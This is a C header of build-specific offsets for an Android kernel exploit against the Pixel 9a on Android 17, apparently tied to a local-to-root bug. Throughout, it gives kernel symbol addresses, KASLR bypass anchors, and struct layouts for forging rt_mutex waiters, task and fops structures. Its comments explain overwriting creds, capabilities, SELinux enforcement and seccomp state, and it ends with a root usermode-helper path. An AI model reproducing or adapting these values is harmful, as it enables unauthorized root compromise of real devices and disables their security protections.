// tegu — Pixel 9a, Android 17
// Build: CP2A.260705.006
// Kernel: 6.1.157-android14-11-gbd23337e42e7-ab14791245  (KMI android14-6.1)
// Codename, build ID, fingerprint and kernel release above are confirmed
// against a physical Pixel 9a on this build.
//
// PROVENANCE
// ==========
// Two independent sources, both carved out of
// .factory-images/tegu-cp2a.260705.006/Image — no value below is inherited
// from another target and none is guessed:
//
//  1. Symbol addresses — kallsyms, recovered with vmlinux-to-elf (102271
//     symbols). Every symbol referenced here was resolved by name; nothing
//     was pattern-matched or approximated.
//
//  2. Struct member offsets — the kernel's own BTF blob, which is linked
//     into this image (CONFIG_DEBUG_INFO_BTF=y) and sits at file offset
//     0x01661000 (5653158 bytes, magic 0xeb9f). BTF is emitted by pahole
//     from the built vmlinux's DWARF, so it describes *this* build's real
//     layout — it is authoritative in a way kernel source is not, and it
//     already accounts for any layout randomization. (Moot here anyway:
//     CONFIG_RANDSTRUCT is not set in this build's embedded IKCONFIG.)
//
// tegu is the only android14-6.1 target in this repo; blazer/mustang/rango
// are all android15-6.6. Their struct offsets are NOT valid here and the
// differences are not subtle — see the DIVERGENCE notes below. Anything
// tagged "arch constant" is the one category that is neither a symbol nor a
// struct member, and is called out individually.
//
// STATUS: complete, self-consistent, and never run on hardware. Every value
// is sourced, but "sourced" is not "tested" — an exploit that gets a live
// kernel write wrong does not fail cleanly.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "tegu-CP2A.260705.006-app"
#else
#define BUILD_VARIANT_LABEL "tegu-CP2A.260705.006-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/tegu/tegu:17/CP2A.260705.006/15641320:user/release-keys"
#endif

// ── Base / memory layout ────────────────────────────────────────────────
// DIVERGENCE from blazer (0xffffffc080000000). This is not a guess and not
// the vmlinux-to-elf "first symbol" fallback that happens to agree with it:
// on arm64, KIMAGE_VADDR == MODULES_END == _PAGE_END(VA_BITS_MIN) +
// MODULES_VSIZE. This build has CONFIG_ARM64_VA_BITS=39, so _PAGE_END is
// 0xffffffc000000000, and the 6.1 module region is 128MB — giving
// 0xffffffc008000000. blazer's 6.6 kernel uses the 2GB module region
// introduced later, hence its +0x80000000. Both fall out of the same
// formula; the kernel line is what differs.
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── Kernel symbol offsets (kallsyms, resolved by name) ──────────────────
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
#define ASHMEM_FOPS_OFF             0x01280b50ULL

// NAMING: this is `misc_fops`, not an "ashmem_misc_fops" — no such symbol
// exists in any kernel. /dev/ashmem is a misc device, so a freshly opened fd
// starts on the single shared misc_fops (drivers/char/misc.c), whose .open()
// looks the driver up by minor and swaps file->f_op to ashmem_fops. The macro
// keeps its historical name; the symbol it resolves to is misc_fops.
#define ASHMEM_MISC_FOPS_OFF        0x012215e0ULL

// NAMING: kallsyms spells this `compat_ashmem_ioctl`, not
// `ashmem_compat_ioctl`. Cross-checked against the live ashmem_fops struct
// in the image: its compat_ioctl slot (FOPS_COMPAT_IOCTL_OFF, 0x58) holds
// exactly this address.
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL

#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL

// DIVERGENCE: `copy_splice_read` does not exist on 6.1 — it is the 6.6-era
// rename/rework of the generic "splice by driving ->read_iter" helper. Its
// 6.1 counterpart is `generic_file_splice_read`, which has the identical
// file_operations::splice_read prototype
// (struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int)
// and likewise funnels through call_read_iter — i.e. into the
// configfs_read_iter we plant at FOPS_READ_ITER_OFF. The payload only ever
// *writes* this pointer into the forged fops table (util.c
// put_fake_fops_table, fops.c refresh table); it never splices through it,
// so it has to be a correctly-typed, plausible function pointer rather than
// a behaviourally identical one.
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL /* generic_file_splice_read */

// DIVERGENCE: 6.1 has no bare `selinux_enforcing` global — SELinux state
// lives in `struct selinux_state selinux_state`, and .enforcing is its first
// member (byte offset 0x0, per BTF), so the address is the struct's own.
// Verified not randomized: CONFIG_RANDSTRUCT is unset in the embedded
// IKCONFIG, and BTF reflects post-randomization layout regardless.
#define SELINUX_ENFORCING_OFF       0x0225a420ULL /* selinux_state + 0x0 */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// ── Slide references (KASLR bypass anchors) ─────────────────────────────
#define SLIDE_NFULNL_LOGGER_OFF     0x020129d0ULL
#define SLIDE_LOGGERS_0_1_OFF       0x02012918ULL

// Despite the name this is not about boot_id randomness. slide.c plants it
// as the rb_left pointer of the forged waiter's rbtree nodes, so the tree
// rotation clobbers whatever sits there; fops.c restore_slide_boot_id() then
// puts the original value back. That tells us exactly what it must be: a
// kernel data slot whose correct content is &sysctl_bootid. That is the
// .data field of the `boot_id` entry in random_table[], located by walking
// random_table (0x02137c00) in 0x40-byte struct ctl_table strides to the
// entry whose procname is "boot_id" (index 4) and confirming its .data
// already equals sysctl_bootid (SLIDE_SYSCTL_BOOTID, below).
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL /* &random_table[4].data */

#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page layout (payload-internal constants, not build-specific) ────────
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

// ── struct file_operations (BTF, size 0x110) ────────────────────────────
// DIVERGENCE: every pointer from unlocked_ioctl onward sits 0x08 higher than
// on blazer. 6.6 dropped ->sendpage from file_operations; 6.1 still has it,
// which shifts the tail. SPLICE_READ in particular is 0xc8 here — 0xc0 is
// ->splice_write, and writing our read helper there would be silently wrong.
#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x50
#define FOPS_COMPAT_IOCTL_OFF   0x58
#define FOPS_MMAP_OFF           0x60
#define FOPS_OPEN_OFF           0x70
#define FOPS_RELEASE_OFF        0x80
#define FOPS_SPLICE_READ_OFF    0xc8
#define FOPS_SHOW_FDINFO_OFF    0xe0

// ── struct rt_mutex_waiter (BTF, size 0x58) ─────────────────────────────
// DIVERGENCE, and the one place where 6.1 is not merely shifted but shaped
// differently. 6.6 wraps each rbtree node in `struct rt_waiter_node`
// { rb_node entry; int prio; u64 deadline; }, so tree and pi_tree each carry
// their own prio/deadline. 6.1 has a flat struct with a single prio and a
// single deadline shared by both nodes. The TREE_/PI_TREE_ prio and deadline
// macros therefore deliberately alias onto the same bytes here. That is
// sound rather than a fudge: util.c and slide.c write FAKE_WAITER_PRIO to
// both prio macros and 0 to both deadline macros, so the aliased writes are
// idempotent. Field order also differs — task/lock/wake_state precede
// prio/deadline on 6.1 and follow them on 6.6.
#define FAKE_WAITER_TREE_ENTRY_OFF      0x00
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_WAKE_STATE_OFF      0x40
#define FAKE_WAITER_TREE_PRIO_OFF       0x44 /* aliases pi_tree prio */
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x44 /* aliases tree prio */
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x48 /* aliases pi_tree deadline */
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48 /* aliases tree deadline */
#define FAKE_WAITER_WW_CTX_OFF          0x50
#define FAKE_WAITER_SIZE                0x58

// ── struct task_struct (BTF, size 0x12c0) ───────────────────────────────
// DIVERGENCE: everything from ->tasks onward has moved relative to blazer
// (pid 0x618→0x630, cred 0x820→0x838, comm 0x830→0x848, seccomp
// 0x8e8→0x900, the whole pi_* block 0x90c→0x924). The head of the struct
// (usage/prio/normal_prio/sched_task_group) happens to be unchanged.
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x348 /* ->sched_task_group */
#define FAKE_TASK_PI_LOCK_OFF       0x924
#define FAKE_TASK_PI_WAITERS_OFF    0x938
#define FAKE_TASK_PI_TOP_TASK_OFF   0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define TASK_PID_OFF                  0x630
#define TASK_TGID_OFF                 0x634
#define TASK_REAL_PARENT_OFF          0x640
#define TASK_REAL_CRED_OFF            0x830
#define TASK_CRED_OFF                 0x838
#define TASK_COMM_OFF                 0x848
#define TASK_TASKS_OFF                0x550
#define TASK_SECCOMP_OFF              0x900
#define TASK_ATOMIC_FLAGS_OFF         0x5f0
// task_struct embeds struct thread_info at 0x0 and ->flags is its first
// member, so this stays 0x00 (BTF-confirmed, not assumed).
#define TASK_THREAD_INFO_FLAGS_OFF    0x00

// ── struct cred (BTF, size 0xb0) ────────────────────────────────────────
// DIVERGENCE: uniformly 4 bytes lower than blazer, because 6.6 widened
// cred->usage from atomic_t to atomic_long_t. CRED_CAPS_OFF points at
// cap_inheritable; the five kernel_cap_t sets are contiguous 8-byte entries
// in the order root.c's CRED_CAP_* indices expect
// (inheritable, permitted, effective, bset, ambient → 0x28..0x50).
#define CRED_UID_OFF                  4
#define CRED_SECUREBITS_OFF           36
#define CRED_CAPS_OFF                 40
#define CRED_SECURITY_OFF             120
// Default only — root.c overwrites selinux_cred_blob_off at runtime from
// SELINUX_BLOB_SIZES.lbs_cred before it is used.
#define SELINUX_CRED_BLOB_OFF         0
// struct task_security_struct (BTF, size 0x18)
#define SELINUX_CRED_OSID_OFF         0
#define SELINUX_CRED_SID_OFF          4

// ── struct seccomp (BTF, size 0x10) — unchanged from blazer ─────────────
#define SECCOMP_MODE_OFF              0x00
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x08
// arch constants, not struct members and not in BTF: TIF_SECCOMP is bit 11
// in arch/arm64/include/asm/thread_info.h and PFA_NO_NEW_PRIVS is the first
// PFA_* in include/linux/sched.h. Both are unchanged between 6.1 and 6.6.
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

// DIVERGENCE: mm_struct->owner, 0x408 on blazer.
#define MM_OWNER_OFF                  824
#define PIPE_BUFFER_SIZE              0x28

// ── struct page / struct slab (BTF) ─────────────────────────────────────
// DIVERGENCE: STRUCT_SLAB_CACHE_OFF is 0x08 on blazer. 6.6 hoisted
// ->slab_cache to sit directly after __page_flags; on 6.1 the slab_list /
// rcu_head union still comes first, putting slab_cache at 0x18. struct page
// itself is unchanged (compound_head 0x08, page_type 0x30, size 0x40).
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// ── struct workqueue_struct / pool_workqueue / worker_pool / work_struct ─
// BTF-confirmed; all identical to blazer.
#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF  0x28
#define POOL_NR_IDLE_OFF   0x3c

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── struct configfs_buffer (BTF, size 0x80) — identical to blazer ───────
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

// ── su_daemon UMH ───────────────────────────────────────────────────────
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
